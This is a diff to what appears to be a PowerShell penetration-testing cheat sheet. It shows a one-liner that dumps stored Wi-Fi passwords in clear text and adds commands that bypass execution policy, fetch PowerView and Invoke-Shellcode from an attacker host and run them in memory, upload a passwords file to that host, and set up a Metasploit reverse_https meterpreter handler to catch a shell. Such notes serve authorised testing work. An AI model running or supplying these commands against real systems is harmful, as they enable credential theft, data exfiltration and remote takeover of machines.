@@ -91,7 +91,40 @@ Get-Help <tool>                        Get help on any tool
 
 - Show Wi-Fi passwords
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
-- Show AV installed
-Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct
+# Download a file
+cd /usr/share/windows-resources/powersploit/Recon/
+python3 -m http.server 80
+
+powershell -nop -exec bypass
+iwr -UseBasicParsing http://172.16.219.133/PowerView.ps1 -OutFile .\PowerView.ps1
+Import-Module .\PowerView.ps1
+Get-NetLocalGroup
+
+# Execute a remote file in memory
+powershell -nop -exec bypass
+iex (iwr -UseBasicParsing http://172.16.219.133/PowerView.ps1); Get-NetLocalGroup
+
+# Upload a file
+powershell -nop -exec bypass
+IEX "(New-Object Net.WebClient).UploadString('http://192.168.1.5/passwords.txt',"<PostDATA>")"
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# PowerSploit - getting a shell without writing to disk     *** NEED to VERIFY ***
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lhost 192.168.1.5
+set lport 443
+exploit -j
+
+- Open a new tab
+cd /usr/share/windows-resources/powersploit/CodeExecution/
+python3 -m http.server 80
+
+- Windows execute a remote file in memory
+powershell -nop -exec bypass
+IEX "(New-Object Net.WebClient).DownloadString('http://192.168.1.5/Invoke-Shellcode.ps1');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.5 -Lport 443 -Force"
 
